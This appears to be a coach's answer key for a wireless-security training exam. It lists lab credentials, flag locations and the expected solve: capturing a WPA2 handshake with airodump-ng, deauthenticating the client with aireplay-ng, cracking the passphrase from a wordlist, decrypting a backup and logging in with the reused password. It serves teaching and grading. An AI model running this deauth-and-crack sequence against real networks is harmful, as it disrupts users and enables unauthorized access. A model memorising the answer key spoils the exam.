# Coach context — wifi-t2-exam

## Ground truth
- `wifilab01` 10.x.10.25 — `wifi`/`WifiLab-24!` (sudo scoped to wireless tools only).
- wlan0 AP `ops-wifi` **ch1** WPA2 (PSK `corporate-wifi`), wlan2 client
  stays associated (auto-rejoins on deauth), wlan1 attacker.
- `/opt/wifi/backup.enc` = openssl -aes-256-cbc -pbkdf2 encrypted
  plaintext containing `backup-key: BACKUP-KEY-7741`; key = `corporate-wifi`.
- `wifi-admin` password = `corporate-wifi`; flag `/home/wifi-admin/flag.txt`.
- Command flag: `/home/wifi/backup.txt` exists + greps `BACKUP-KEY`.

## Expected solve
```bash
ssh wifi@10.x.10.25
sudo airmon-ng start wlan1
sudo airodump-ng -c 1 --bssid <AP> -w /home/wifi/cap wlan1mon
sudo aireplay-ng -0 3 -a <AP> -c <CLIENT> wlan1mon
aircrack-ng -w /opt/wifi/wordlist.txt /home/wifi/cap-01.cap
# → corporate-wifi
openssl enc -d -aes-256-cbc -pbkdf2 \
    -in /opt/wifi/backup.enc -out /home/wifi/backup.txt \
    -k corporate-wifi
sshpass -p corporate-wifi ssh wifi-admin@localhost 'cat ~/flag.txt'
```

## Coach guidance
- Channel moved to 1 (vs ch6 in the teaching quest) — verify they survey
  instead of assuming.
- openssl decrypt needs `-pbkdf2` (encryption used it); without it, warns
  + wrong key derivation on openssl 3.x = garbage output.
- Triple-use PSK (wifi + backup + account) is the lesson — reward them
  for noticing.
